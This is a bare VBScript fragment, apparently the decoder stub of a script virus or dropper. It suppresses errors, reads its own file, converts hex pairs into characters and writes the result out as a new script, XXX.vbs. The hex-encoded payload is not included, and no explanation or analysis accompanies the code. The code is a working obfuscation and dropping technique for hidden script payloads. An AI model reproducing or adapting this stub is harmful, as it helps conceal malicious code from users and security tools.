   '
   on error resume next
   Set fso = CreateObject("scripting.filesystemobject")
   Set r = fso.opentextfile(wscript.scriptfullname)
   Set n = fso.createtextfile("XXX.vbs")
   r.Skip (1)
   Do
   aa = r.read(2)
   aaa = Chr("&h" + aa)
   n.write aaa
   Loop While r.atendofline = False
   r.Close
   n.Close
